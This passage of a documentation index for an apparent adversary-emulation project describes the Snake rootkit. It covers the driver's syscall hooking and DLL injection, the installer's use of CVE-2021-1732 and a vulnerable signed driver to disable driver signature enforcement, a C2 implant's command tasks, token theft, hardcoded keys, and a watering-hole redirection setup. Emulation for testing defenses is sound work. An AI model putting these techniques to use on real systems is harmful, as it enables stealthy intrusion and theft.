detection and injecting the usermodule. To accomplish these goals the driver comes equipped with several features:","libinifinityhook is used to filter several syscalls","An embedded DLL is XOR'd and dropped to disk","This DLL is then injected into a SYSTEM level process ( taskhostw)","The Windows Filtering Platform is used to monitor processes that communicate over HTTP/HTTPS","Once a target process is observed communicating, it injects the DLL","If the injected process exits, the driver will begin listening for HTTP/HTTPS from target processes again and then reinject","With those tasks completed, the stage is now set for the usermodule to manage command and control communications and execute tasks."]},{"l":"Installation"},{"l":"Visual Studio Configuration","p":["Building the driver requires several SDKs from Microsoft. Follow the Microsoft setup instructions here in order to guarantee a functional kernel development environement.","Windows SDK","Windows Driver Kit","OR","Enterprise Windows Driver Kit(Self-contained build env in a mountable ISO)"]},{"i":"python-optional","l":"Python (optional)","p":["If you would like to use the ..\\buildall.ps1 script which includes installer and usermodule builds, XORs, and embedding, you will need to install Python 3.x. Ensure that it is on your PATH and can be called via python from the command line."]},{"l":"Compilation","p":["All compilation so far is done using Configuration:Release Platofrm:x64","If you are not using the VS GUI, there is a script turla\\Resources\\Snake\\SnakeDriver\\build_and_copy_driver.ps1 that will select the proper configuration for you, and takes an optional argument to copy the newly built driver to a new directory.","SnakeDriver is version dependent, and has been tested and configured for two versions of Windows 10: 1809 and 1903. This is necessary to be comaptible with InfinityHook. It can be expanded to support more versions of Windows by extracting the appropriate syscall numbers and adding a new #ifdef. Syscall numbers can be found here"]},{"l":"Visual Studio Configurations","p":["Configuration","Platform","Notes","Release","x64","DEBUG_PRINT, WIN10_1903","Release_1903","No debug output, pdb renamed, WIN10_1903","Release_1809","No debug output, pdb renamed, WIN10_1809"]},{"l":"Compiling the driver","p":["Compiling via the VS GUI and msbuild are supported. InfinityHook compilation warnings are to be expected.","Sample msbuild command (Must be run from VS Developer Command Prompt):","msbuild -target:Clean,Build -property:Configuration=Release_1903,Platform=x64"]},{"i":"buildallps1","l":"buildall.ps1","p":["This compilation script will compile the usermodule, XOR it, convert it into payload.hpp in the driver, and then compile the driver. all intermediate and final files will be stored in .\\out\\"]},{"l":"Running","p":["If you are running just the driver, you must have a machine with test signing mode ON. To do this, open an Administrative command prompt, enter Bcdedit.exe -set TESTSIGNING ON and reboot your machine. You should now see \"Test Mode\" in the bottom right hand corner of your desktop.","Run the script .\\run_driver.ps1 start in the same directory as your driver, and it will automatically create and start the driver for you. To stop the driver, run .\\run_driver.ps1 stop","If you are running the driver via the installer, test signing mode is not necessary. Please refer to the installer documentation for more information."]},{"l":"Debugging","p":["If you build the driver with the DEBUG_PRINT compiler flag it will output some helpful status messages. You can view this output using DebugView or WinDbg while installing and running the driver."]},{"l":"Cleanup","p":["Use the Snake Installer cleanup script to remove the driver and its artifacts. This will require a reboot."]},{"l":"References","p":["https://github.com/Rhydon1337/windows-kernel-dll-injector","https://github.com/JaredWright/WFPStarterKit","https://github.com/everdox/InfinityHook","https://github.com/DarthTon/Blackbone"]},{"l":"CTI","p":["https://www.circl.lu/pub/tr-25/#analysis-payload","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/analyzing-uroburos-patchguard-bypass"]}],[{"l":"InfinityHook Library","p":["Enables system call hooks, among other things, without disturbing PatchGuard. For more detail, see the original InfinityHook repository on Github. We utilize the libinfinityhook library."]},{"l":"Compatibility","p":["Known functional on Windows 10 v1903 or older. Tested on Build 17763.rs5_release.180914-1434 with test signing ON."]},{"l":"Modifications","p":["Updated VS Project file libinfinityhook.vcxproj to incorporate into SnakeDriver, include Spectre Mitigation, and new Build targets","Wrapped externs in infinityhook.h with #ifdef __cplusplus to improve compatibility","Added SYSTEM_HANDLE_INFORMATION structure definitions to ntint.h","Relocated CkclSessionGuid from ntint.h to infinityhook.cpp"]}],[{"l":"Snake Installer","p":["This component combines several others into a convenient all-in-one executable to setup the Snake rootkit.","These embedded components are:","The privilege escalation exploit CVE-2021-1732","The signed, vulnerable, Gigabyte driver","The unsigned Snake driver (rootkit)","Within the Snake driver, the Snake usermodule","At a high level, the installer takes the following steps:","Elevates privileges, if the force flag is specified.","Creates a directory, specified by the path flag, to house files related to Snake's execution. The default path requires elevated privileges to create.","Drops a vulnerable signed driver and a malcious unsigned driver to path specified in the previous bullet.","Abuses the vulnerable driver to disable Driver Signing Enforcement.","Installs the unsigned driver","The unsigned driver is then responsible for two usermodule injections. One responsible for network communication (user privileges), and one responsible for execution (SYSTEM privileges)","Once the rootkit is running, it will attempt to cleanup by: renabling DSE, and removing the vulnerable Gigabyte driver service and .sys file."]},{"l":"Usage","p":["The drivers are bundled within the installer executable. They will be written in the specified installation directory path. For example, C:\\WINDOWS\\$NtUninstallQ608317$\\gigabit.sys."]},{"l":"Troubleshooting","p":["C:\\Windows\\$NtUninstallQ608317$ is the default snake directory and should contain several files. If the installer was run with the -f(force privilege escalation) flag as a non-admin user, then the presence of this directory indicates that privilege escalation was successful.","C:\\Windows\\msnsvcx64.dll is the usermodule. If present on disk, then the rootkit driver ran far enough to drop the file there.","dbsvcng64.bin is the user-module DLL log file for command execution (process creation, exit codes, command output)","Files on disk","gigabit.sys is the default vulnerable driver file. This file should not be present after the installer finishes.","gusb.sys is the default rootkit driver file.","Incomplete output via C2","Injected DLL","No callback but log files are present","Output but no callback","Services","svcmon32.sdb is the user-module DLL log file for C2-related logging (heartbeats, beacons, payload downloads, instruction parsing, data uploads)","svcstat64.bin is the user-module DLL log file for pipe server logging (when the user module is running in pipe server / c2-comms mode)","The following components can be used to identify how far execution got before failure:","The gusb service should be running","The installer can occasionally fail under certain conditions. Read ahead for information required to diagnose an issue, or skip to the subheading matching your issue for remediation steps.","The system crashes","The taskhostw process running as SYSTEM should have the usermodule dll loaded at all times after a successful installer run","The temporary gigabit service should no longer be present once the installer finishes","There are several target processes ( msedge) that will have the usermodule injected if they are detected communicating over HTTP/S","udmon32.bin is the user-module DLL log file for pipe client logging (when the user module is running in pipe client / execution mode)"]},{"l":"General cleanup steps","p":["For a thorough cleanup, we recommend referencing the cleanup section in the Snake overall README file.","However, if you want to manually run certain cleanup portions, you can reference the below instructions.","From an adminstrative prompt the following commands can be used to setup a second attempt.","If the usermodule DLL is resident within taskhostw the computer will need to be rebooted so that handle to the DLL will be released.","If the usermodule DLL is resident within msedge all Edge processes will need to be closed.","Delete the usermodule from disk and cleanup will be complete."]},{"l":"Incomplete output via C2","p":["If stdout does not log Installation complete, identify whether or not the usermodule DLL was written to C:\\Windows\\msnsvcx64.dll.","If the file was not written to disk, the installer did not run the rootkit service","Simply follow the cleanup steps from an admin command prompt and try again","If the file was written to disk, the rootkit is running","Check the home directory for vulnerable gigabit.sys driver, if it isn't there it should be safe to proceed.","Ohterwise, follow the cleanup steps from an admin prompt"]},{"l":"Output but no callback","p":["If the installer completes the output should end with:","Installation complete","When the installer runs successfully, we need to see how far the driver made it through injection of the two usermode DLLs. Examine the installer home directory for the presence of the usermodule's encrypted log files.","If svcmon32.sdb or svcstat64.bin are missing, then the user-module DLL may not have successfully been injected into the target browser process (in our emulation, Microsoft Edge).","Simply generate some traffic from the browser to ensure injection is triggered (e.g. open a new tab and browse to a site)","Close all edge processes and try again (this doesn't require administrator rights)","If udmon32.bin or dbsvcng64.bin are missing, then the execution instance of the usermodule DLL may not have successfully been injected into taskhostw.","As an administrator, enumerate the DLLs loaded into the instance of taskhostw owned by the SYSTEM user","If it's not present, follow the cleanup instructions and try again"]},{"l":"No callback but log files are present","p":["There may be an issue with named pipe communication between usermodule instances. This requires pulling the encrypted logs off the host, decrypting and analyzing them for issues. For specific instructions, please see the user-module troubleshooting guide."]},{"l":"The system crashes","p":["Retrieve the dump files for further analysis","C:\\Windows\\MEMORY.DMP","C:\\Windows\\minidump\\DUMP_CREATED_AT_TIME_OF_CRASH.dmp","When possible, loading the associated PDB file while debugging is advised."]},{"l":"Build"},{"l":"Requirements","p":["vcpkg","CMake 3.23","C++23(for std::expected)","vcpkg is used to manage third party libraries. Once installed, make sure to set the VCPKG_ROOT envrionment variable as it will be used during the build process."]},{"l":"Vulnerable Driver","p":["The Snake Installer makes use of a vulnerable Gigabyte driver to disable Driver Signing Enforcement. To make use of this repository, said driver needs to be downloaded, XOR'd with the key 0xd3, and placed at the path: data/gdrv.sys.xor. Once that dependency has been satisfied the subsequent build commands can be followed."]},{"l":"Compilation"},{"l":"Visual Studio","p":["Clone the turla repo within the IDE or open the existing local repository","Project -> CMake Workspace Settings","Edit the CMake workspace settings to contain the following:","The installer can now be built and debugged using Visual Studio's native CMake integration."]},{"l":"Command Line","p":["The binary will be output into build/x64-debug/src/installer.exe"]},{"l":"Cleanup","p":["To undo changes to the system after running the installer use the included script cleanup.ps1. If the usermodule has been injected into taskhostw, the system may require a reboot prior to cleanup."]},{"l":"Disabling DSE","p":["Driver Signature Enforcement (DSE) prevents unsigned drivers from interacting with the Windows kernel. However using a vulnerable driver, which is signed, we can disable DSE temporarily before loading our malicious driver."]},{"i":"vulnerable-driver-1","l":"Vulnerable Driver","p":["We are currently using the Gigabyte gdrv.sys which has a known kernel read/write vulnerability. This can be swapped out for any driver with the ability to write to kernel space."]},{"i":"cig_cioptions","l":"CI!g_ciOptions","p":["Driver Signing Enforcement is managed by the Code Integrity kernel module of Windows. It manages the variable, g_ciOptions, which contains the current driver verifications mode. It can either be set to only allow any drivers, only signed drivers or test signed drivers.","Mode","Value","Off","0x0","On","0x6","Test Signing","0xe"]},{"l":"Leak","p":["In order to overwrite CI!g_ciOptions from user-mode we need to first leak it's kernel address. This is possible by retrieving the base address of CI.dll in kernel space, and then calculating the offset to g_ciOptions.","Use the undocumented feature of NtQuerySystemInformation to leak the base address of all currently running kernel modules","Parse the preffered base address of C:\\Windows\\System32\\ci.dll from its PE headers","Map C:\\Windows\\System32\\ci.dll into a memory section and calculate the offset to the export CiInitialize","Do a binary scan of the assembly within CiInitialize searching for a call to the function CipInitialize","Binary scan again from CipInitialize onwards to find a reference to g_ciOptions","This offset may change between Windows versions, but is easy to find using a disassembler and Microsoft's provided symbol server."]},{"l":"References","p":["https://github.com/hfiref0x/KDU","https://v1k1ngfr.github.io/loading-windows-unsigned-driver/","https://seclists.org/fulldisclosure/2018/Dec/39","https://github.com/KaLendsi/CVE-2021-1732-Exploit","https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1732.html"]},{"l":"CTI","p":["https://www.circl.lu/pub/tr-25/#analysis-payload","https://www.virusbulletin.com/virusbulletin/2014/05/anatomy-turla-exploits/","https://artemonsecurity.com/snake_whitepaper.pdf"]}],[{"l":"Snake User Module DLL"},{"l":"Overview","p":["The Snake user module DLL is injected into various userland processes by the rookit via LoadLibrary. Once injected, the user module will either communicate with the C2 server or execute tasks, depending on its mode of operation. The mode of operation is determined by what process the module is injected into - if injected into a browser process, the module will run in C2 communication mode. Otherwise, it will run in task execution mode.","The DLL runs via its DllMain function and branches off into either C2 communication mode or task execution mode, depending on the name of the injected process. The following process names will trigger C2 communication mode:","chrome.exe","firefox.exe","msedge.exe","iexplore.exe","All other process names will trigger task execution mode.","For full functionality, the module must be injected into a browser process and non-browser process. This will allow communication with the C2 server as well as actual command execution. The two module modes communicate with each other via named pipes. Specifically, the C2 communication module listens on \\\\.\\pipe\\commsecdev for beacon requests and task output from the task execution module, and the task execution module listens on \\\\.\\pipe\\commctrldev for instructions passed on by the C2 communication module.","The task execution module will periodically send beacon requests to the C2 communications module, which will forward the requests to the C2 server and send back the instruction response. If the instruction is to download or upload files, the C2 communications module will handle that directly without intervention from the task execution module. If the instruction is to execute a process or command, the execution module will run the task and send the output to the C2 communications module to forward to the C2 server.","Turla has used a similar user module DLL architecture in the past where they broke functionality apart into a pipe server and pipe client module, where the pipe server would handle communications with the C2 server and the pipe client would handle other tasks like command execution 1."]},{"l":"C2 Communications","p":["The user module communicates with a hardcoded C2 server and port value via HTTP GET/POST requests. To determine whether or not the server is online, the module will perform a heartbeat check by requesting the /PUB/home.html file. The server must respond with 1 to indicate that it is online.","Turla has used heartbeat URLs like /D/pub.txt and /IMAGE/pub.html 1","After successful heartbeat verification, the module will perform GET requests on /PUB/{implant_id}(e.g. GET /PUB/123456 to perform beacons and receive instructions. Some instructions may require the implant to run processes or execute shell commands, and the output will uploaded to the C2 server via POST requests to /IMAGES/3/{instruction_id}(e.g. POST /IMAGES/3/123456789012345678 to upload the command output for instruction 123456789012345678).","Note that while Turla has uploaded collected log files to its C2 server by sending POST requests to URLs like /IMAGE/2/{random numbers} 1, we opted to have the implant automatically send the output to the server to improve operator usability (i.e. not having to manually request command output each time a command is run).","When instructed to download a payload, the module will send a GET request to /IMAGES/3/{instruction ID}, using the instruction ID for the associated instruction. If the instruction ID matches a tasked instruction on the server side, the payload will be delivered, and the module will save it on disk at the specified location.","When instructed to upload an arbitrary file, the module will send a POST request to /IMAGES/3/{instruction ID}, using the instruction ID for the associated instruction. If the instruction ID matches a tasked instruction for non-command-output file uploads on the server side, the C2 server will accept the upload and save it server-side. Note that the endpoint is the same as for command output uploads - the C2 server distinguishes upload types based on the instruction ID used in the URL.","The implant can also be instructed to upload its log files via POST requests 1 to /IMAGES/3/{log file ID}, where the log file IDs are hardcoded ID strings for each log type:","62810421015953103444 for C2 logs","23329841273669992682 for execution logs","59463656487865612747 for pipe server (C2 communications module) logs","16488587954892310865 for pipe client (task execution module) logs","The implant will delete the log files after upload to clear them out 1."]},{"l":"Implant ID","p":["Prior to beginning C2 communications, the comms module mode will look up the local victim's computer name and use the first 10 characters as an XOR key against the default key value of 2157108421. If the computer name is less than 10 characters, it is repeated as an XOR key. The XORed value is then converted to hex to represent the implant ID. If the implant fails to retrieve the computer name for whatever reason, it uses the default key value 2157108421 as the implant ID."]},{"l":"User Agent","p":["Turla has used the user agent string Mozilla/4.0 (compatible; MSIE 6.0) in the past for Snake 1. However, to improve defense evasion purposes, we opted for setting a commonly used user agent based on the browser process that the user module is injected into:","For chrome.exe, the user module will use Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36","For firefox.exe, the user module will use Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0","For iexplore.exe, the user module will use Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko","For msedge.exe, the user module will use Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/106.0.1370.52"]},{"l":"Tasks","p":["00- \"empty\" instruction. Don't do anything other than sleep before the next beacon.","01- shell command instruction to execute via cmd.exe /c. There will be a single instruction argument, which is a base64-encoded command that the implant will decode and execute. The command output will be sent to the C2 server afterwards.","02- base64-encoded powershell instruction to execute via powershell.exe -nol -noni -nop -enc .... There will be a single instruction argument, which is the base64-encoded command to run. The output will be sent to the C2 server afterwards. Note that we recommend prepending your powershell commands with $ProgressPreference=SilentlyContinue; to avoid the CLIXML stderr.","03- instuction to spawn a process using the specified binary path and optional args. The optional args are base64-encoded, which the implant will decode and execute. The command output will be sent to the C2 server afterwards.","04- instruction to download a file. There will be two arguments - the first one if the filename that is being requested from the C2 server (currently only used for logging purposes), and the second is the location to save the payload on disk. If only a filename is provided as the destination, the payload will be saved in the Snake home directory rather than the current directory (current directory is specified with an explicit .\\).","05- instruction to upload an arbitrary file. There will be one argument - the path to the file on the local system to upload to the C2 server.","06- instruction to upload log files. No arguments needed, since the implant has the log file paths and IDs hardcoded.","A payload instruction may look like the following:","An empty instruction may look like this (type code 00, sleep for 15 seconds):","Each instruction, including empty instructions, is defined by an 18-digit random ID, and is categorized among various instruction types based on a 2-digit type code. The type code determines how to interpret the instruction arguments.","Example:","In the above example, the ID is 402350900690432407, the type code is 01, the command to execute is whoami /all as the user mydomain\\myuser, and the implant will sleep for 20 seconds afterwards.","In the above example, the module will request file malware.exe from the C2 server and save it as benign.exe in the Snake home directory.","Instructions also come with various options:","Note that the available CTI does not dive into much detail in terms of the task format, especially for different instruction types. CTI shows a similar task format but for a different type of instruction (changing C2s rather than executing a shell command). 1","Sleep time, or how many seconds to sleep after performing the instruction and before sending the next beacon.","Task output is automatically sent to the C2 server for operator ease of use.","The following type codes are supported:","The implant receives tasking from the C2 server as part of a successful beacon response. If no task is specified, the implant receives a \"blank\" instruction that simply tells it to sleep for a random number of seconds, within a specified interval (currently between 10 and 20 seconds).","The overall received instruction blob uses the following format:","Username for a user to run a process as, if available."]},{"l":"Running Tasks As Another User","p":["The user module has the capability to run tasks as another user. For instance, while the execution mode typically runs in a SYSTEM process, it can be instructed to start a process as a domain user or domain admin. The module will do this if the received instruction contains a username to run the command as, in domainname\\username format. The module will then do the following:","Take a snapshot of all the current processes on the local system","Search through the processes until it finds a process belonging to the target user","If the process has an elevated token, the module will duplicate the process token and use it to spawn the child process","If the process belonging to the target user is not elevated, continue searching","If all processes are searched and only a non-elevated process was found for the target user, the module will duplicate that token and use it to spawn the child process","If all processes are exhausted and no processes are found belonging to the target user, the module will run the command under its current context","Some Turla samples have access token manipulation capabilities, such as indications of the DuplicateTokenEx and OpenProcessToken functions 3."]},{"l":"Encryption"},{"l":"C2","p":["Turla has used XOR-encryption for communication, such as for tasking and for log files. 1","We use a different XOR key from what Turla uses:","The user module uses XOR encryption in the following cases:","decrypting beacon responses from the C2 server","encrypting command output when sending it to the C2 server","encrypting log messages","encrypting non-log file uploads to the C2 server (logs are already encrypted)","decrypting payload downloads from the C2 server"]},{"l":"Named Pipes","p":["Turla has used CAST-128 encryption for peer-to-peer named pipe communication in other implants. 2","To keep a similar approach, the emulated implant uses CAST-128 encryption for named pipe communication between the execution and comms module modes.","The 128-bit key used is c7daecf7df559a1a6eb1da73617d82c1, which is derived from 5 iterations of PBKDF2-SHA1, with a passphrase of checkmateNASA and salt value of saltandpepper. The passphrase and salt value are hardcoded in the implant, and the key is derived when the implant starts."]},{"l":"Logging","p":["The user module will log various debug, info, and error messages throughout its execution. Various log files are used to split up the different logging categories:","svcmon32.sdb for C2-related logging (heartbeats, beacons, payload downloads, instruction parsing, data uploads)","svcstat64.bin for pipe server logging (when in pipe server mode)","udmon32.bin for pipe client logging (when in pipe client / execution mode)","dbsvcng64.bin for logging related to command execution (process creation, exit codes, command output)","The log files are located in the Snake home directory. Each log message is XOR-encrypted and base-64 encoded prior to being appended to the corresponding log file as a new line. The plaintext format is as follows:","Example:","Note that timestamps are in UTC."]},{"l":"File Mutexes","p":["Since the communication and execution modes both touch the execution and pipe client log files, the Snake user module creates a global mutex for each file:","Global\\WindowsCommCtrlDB for the pipe client log","Global\\WinBaseSvcDBLock for the execution log","The different usermodule modes will use the mutexes to coordinate synchronized file access for the commonly used log files.","Turla has used mutexes in the past, for instance in their Carbon DLL implant. 2"]},{"l":"Troubleshooting","p":["./evalsC2client.py --set-task guid '{type: 6}'","dbsvcng64.bin for logging related to command execution (process creation, exit codes, command output)","Each log file covers different aspects of the implant:","If the Snake installer is successful but you don't receive a beacon, there are two main possible points of failure:","If you do not have a beacon, you will have to manually copy the files from the Windows target host to your linux C2 server, where you can call the control_server/handlers/snake/decrypt_logs.py utility like so:","If you have successful beacons and are troubleshooting other issues, you can task the implant to upload the logs to the C2 server, which will automatically decrypt them and write them to the control_server/files directory:","Note that error codes in the logs will either be a Windows system error code or a custom error code defined in include/usermodule_errors.h","python3 decrypt_logs.py -p /path/to/log -o /path/to/output/file","svcmon32.sdb for C2-related logging (heartbeats, beacons, payload downloads, instruction parsing, data uploads)","svcstat64.bin for pipe server logging (when in pipe server mode)","The C2-related log ( svcmon32.sdb) is used exclusively by the browser-injected DLL process. If the file exists, then the injected DLL was at least able to get far enough to begin logging. If the file exists but is not being updated, then either the DLL crashed or is stuck waiting for the taskhostw-injected DLL to connect to it via named pipes.","The driver was unable to inject successfully into msedge.exe, or the injected DLL crashed","The driver was unable to inject successfully into taskhostw.exe or the injected DLL crashed","The execution log ( dbsvcng64.bin) is used exclusively by the taskhostw-injected DLL and has at least one line written to it when the injected DLL starts up. If the file exists, then the injected DLL was at least able to get far enough to begin logging.","There are two ways to decrypt and read the log files:","To investigate execution-related issues (e.g. failed token impersonation), look at the execution log.","To investigate general C2 communication issues, look at the C2 logs and pipe-related logging.","udmon32.bin for pipe client logging (when in pipe client / execution mode)","You can generally tell which injected DLLs started up by looking for the log files and checking their timestamps:"]},{"l":"Build Instructions","p":["The module requires the Crypto++ library to be built and linked at compile-time. The library was installed on 64-bit Windows using msys2 and mingw64 using the following steps","choco install msys2","Add C:\\tools\\msys64 to your PATH enviromment variable to run msys2. Reopen console windows to register the new env variable.","Run msys2 and within the new prompt, run the following:","Either through the UI or through Powershell, set the user environment variable for MINGW64_ROOT so that the value is the directory where mingw64 was installed via msys2 above:","For example: [System.Environment]::SetEnvironmentVariable('MINGW64_ROOT','C:\\tools\\msys64\\mingw64', 'User')","Reopen any command prompts or terminal windows.","Build the usermodule DLL using the following build command in Powershell from the Resources\\Snake\\UserModule directory. If you want to adjust certain preprocessor directives for the C2 address, C2 port, and home directory, you can do so in the compilation command:","To remove symbols, you can use the strip command:","To verify, you can run strings or objdump --syms bin/usermodule.dll- you should see an empty symbols table."]},{"l":"Unit Tests","p":["(OPTIONAL) If running CMake via Visual Studio Code:","Add C:\\tools\\msys64 to your PATH enviromment variable to run msys2. Reopen console windows to register the new env variable.","C:\\Program Files\\CMake\\bin or equivalent CMake bin folder","C:\\tools\\msys64\\mingw64\\bin or equivalent Mingw-w64 bin folder","C/C++","choco install cmake --installargs 'ADD_CMAKE_TO_PATH=System'","choco install msys2","CMake","CMake Tools","CMake: CMake Path","CMake: Generator","Configure CMake settings in VS Code:","Ensure the following paths are set in the SYSTEM environment PATH variable (note that these may differ in your environment depending on how you installed CMake and mingw64).","If cmake was already installed but is not in your path, add it to your path manually (e.g. C:\\Program Files\\CMake\\bin)","In Command Palette, run CMake: Run Tests","Make sure CMake is installed on your machine","Make sure mingw64 is installed on your machine. In this particular example, msys2 was installed and used to install mingw64.","Make sure you have the following VS Code extensions:","Open the UserModule project folder in VS Code","pacman -S --needed base-devel mingw-w64-x86_64-toolchain","pacman -Syu","Paths to folders containing gcc and g++ compilers if not already included in the above Mingw-w64 path folder.","Reopen console windows to register the new env variables.","Run msys2 and within the new prompt, run the following:","Set to \"MinGW Makefiles\" (no quotes)","Set to wherever the cmake executable is located","Set up and run tests via Powershell from the UserModule directory:","Unit tests were run on a Windows machine using CMake. Each component subfolder has its own unit test setup.","You will need to restart the shell to use cmake."]},{"l":"CTI References","p":["https://artemonsecurity.com/snake_whitepaper.pdf","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.circl.lu/pub/tr-25/"]}],[{"l":"Turla Setup Procedure","p":["Emulation Team Infrastructure Configuration","Linux Attack Platform Setup","Move Unzipped Binaries into Payloads","Download Required Binary Files"]},{"l":"Emulation Team Infrastructure Configuration","p":["See Getting Started for information on setting up the overall range."]},{"l":"Linux Attack Platform Setup","p":["See Setup RedTeam for information on setting up the attack platform."]},{"l":"Move Unzipped Binaries into Payloads","p":["A zip of the scenario binaries have been included here. The binaries.zip can be unzipped to the expected directory location using the following command and password malware:","❗ Snake has not been included in this binaries.zip. Please visit the following resources for building Snake and its components:","Snake Installer Build","Snake Build Script"]},{"l":"Download Required Binary Files","p":["Download and extract the PSTools directory","Copy PSExec.exe to the Resources/payloads/carbon directory","Copy PSExec.exe to the Resources/payloads/snake directory","Download pscp.exe and copy it to the Resources/payloads/carbon directory","Download plink.exe and copy it to the Resources/payloads/carbon directory","Download mimikatz","Update the Mimikatz source code with the PTH adjustments then recompile","Copy mimikatz.exe to the Resources/payloads/carbon and Resources/payloads/snake directory","The Resources/payloads directory should be setup to match the following:","As part of infrastructure setup, EPICDropper_http.exe and EPICDropper_https.exe should be staged on a Wordpress server and renamed to NTFVersion.exe and NFVersion_5e.exe, respectively."]}],[{"l":"Watering Hole","p":["Overview","Expected Usage","Package / OS Requirements","Preflight Checks","Usage Examples","Fingerprinting Details from BEEF (via Evercookie and other bundled tools)","Browser-specific Details","Browser-specific Capabilities","Hardware Details","Location Information","Cleanup Instructions","Credential Details","References","CTI Evidence","Wordpress and Apache"]},{"l":"Overview","p":["\"counter\"","Cleanup","cleanup shell script; deletes all site data & database info; kills any processes anticipated to be running","Component","Description","Fingerprinting","Flash Prep","in-range.html","IP Range","python script to append a js redirection script to an html/php file","python script to install and explain setup of fingerprinting capabilities, including the in-range and out-of-range script files","python script to install iframe prompt for target and handler code within WordPress that toggles visibility based on cookie presence","python script to prepend a php comparison to an html/php file","Redirection","script tag in html file that will load hook.js, applied to IP addresses designated by IP Range python script","Setup","shell script to install and initialize a generic wordpress site","surreptitiously named redirection js file - REQUIRES CONFIG","The watering hole setup scripts are made to streamline the already streamlined process of spinning up a wordpress server and then altering it to mimic either a \"compromised\" site or a malicious site. It has the following components:"]},{"l":"Expected Usage","p":["On the Kali C2 server (where the victim will be redirected to):","On the external benign web server (where the victim will browse to, but will be infected with a watering hole):","The setup and cleanup scripts are what they say on the tin: they will setup or teardown a wordpress site with default and wildly insecure credentials. This is all they do, to allow a user to further set up a watering hole attack as they see fit.","The prep and cleanup scripts are expected to be run at superuser privileges; these scripts create and drop databases in SQL, create public directories, and restart system services. Wordpress does not like being run at superuser privileges, so sudo is frequently used to deescalate to user-level commands during the wordpress install proper.","The redirection script is intended to mimic the result of a site compromised by an injection attack - it appends a JS redirection script that points to a remote file (presumably counter.js) to be the src of a script tag. In conjunction, counter.js is expected to be placed on an infection proxy. When executing, write the redirection script to point to counter on the infection proxy host. You must also edit counter.js when placing it on the infection proxy to redirect the user to where you will be checking their IP addresses - presumed to be the infection proxy host itself.","The fingerprinting script installs the BEEF framework, reviews necessary config changes, and prepares user to run beef on local machine in anticipation of victim visit.","The beef setup script confirms that the user has changed BEEF's default credentials and reminds them to alter the appropriate IP information in their IP range script.","The ip range script creates a string of php code and places it in a php file on a separate wordpress site - the one that the client will be redirected to. It will determine if the client is in the range of IP addresses that are of further interest.","The flash prep script copies a string of iframe HTML to a file of your choosing, presumably the index page of your malicious website, and copies a dropper file to the root of your web server that will be downloaded when a user clicks the link inside the iframe.","Both shell scripts are run without argument.","ip_range.py, redirection.py and flash_prep.py scripts expect arguments. All python scripts accept the --help flag."]},{"i":"package--os-requirements","l":"Package / OS Requirements","p":["These scripts were developed on, and are expected to be run on, a Kali Linux box, which is a Debian-based distribution. Service/system calls and package manager examples may differ between distributions.","These scripts expect default Kali installations of Apache web server and SQL(MariaDB). If you don't have them or they've been pruned from your Kali install, get them back with","An apache config file for the wordpress site should be included in the directory. Regardless, links below will be provided if one needs to be made from scratch.","Conversely, the wordpress install should create a wordpress config file for you, but this command expects a running SQL service.","If you are on a system without SQL, instead uncomment the portion of the script that copies the config file to the wordpress directory, and comment out the SQL and wp config portions of the script. These places are commented appropriately.","If you are on a system with a SQL installation similar to Kali, the script will handle the creation of this config file for you."]},{"l":"Preflight Checks","p":["Preflight for a setup script? Yes, just please make sure that you've got everything operational. Get on to the box that you're installing things on:","Make sure that you've got apache and mysql running.","Make sure that you've got sudo privileges","Once you've installed beef via fingerprinting.py, check that you've changed the default credentials"]},{"l":"Usage Examples","p":["Note that expected usage is that the redirection and the ip range / fingerprinting scripts are to be run on different servers."]},{"i":"fingerprinting-details-from-beef-via-evercookie-and-other-bundled-tools","l":"Fingerprinting Details from BEEF (via Evercookie and other bundled tools)","p":["Not all the information here is available on every machine. Some information will be listed as \"Unknown\", some information will simply be blank. This represents the information available to the developer when BEEF & evercookie was tested. This list is provided in case third parties ask about the specificity of detail that the fingerprinting tool provides, as opposed to the information specifically sought by the adversary when identifying the victim."]},{"l":"Browser-specific Details","p":["Browser Engine (e.g. Gecko)","Reported Name (e.g. Mozilla/5.0)","Platform (e.g. Linux x86_64)","Plugins (As opposed to \"capabilities\" below, this includes PDF viewer information)","Cookies","Hostname & Port","Referrer","Windows Height & Width","URI"]},{"l":"Browser-specific Capabilities","p":["ActiveX","Flash","Google Gears","PhoneGap / Apache Cordova","QuickTime","RealPlayer","Silverlight","VB Script","VLC","WebGL","WebRTC","WebSocket","WMP"]},{"l":"Hardware Details","p":["Battery Level","Architecture (e.g. x86_64)","CPU Cores","GPU Details / Driver (e.g. using llvm_pipe instead of dedicated GPU)","Memory","Screen Color Depth","Screen Height & Width","Is the screen touch-enabled?","OS Architecture","OS Family & Name","OS Version"]},{"l":"Location Information","p":["City","Country","IP Address"]},{"l":"Cleanup Instructions","p":["Cleanup script will drop wordpress database and user, delete wordpress files, and deactivate the wordpress apache config file.","If for any reason you need to separately stop, pause, or restart the BEEF process but you cannot remember the PID, list all ruby processes then investigate each one:"]},{"l":"Credential Details","p":["For the SQL (MariaDB) installation, the script creates (and the config file expects) the following default credentials:","For the wordpress administration, the script creates (and wordpress expects) the following default credentials:","For the beef installation, the installation has the following default credentials that must be changed in */beef-master/config.yaml"]},{"l":"References"},{"l":"CTI Evidence","p":["https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf"]},{"l":"Wordpress and Apache","p":["Wordpress reference: https://developer.wordpress.org/cli/commands/","Apache configuration reference: https://httpd.apache.org/docs/current/configuring.html","Create new Apache configuration: https://ubuntu.com/tutorials/install-and-configure-apache"]}],[{"l":"R5 Infrastructure Project"},{"l":"Evals Round 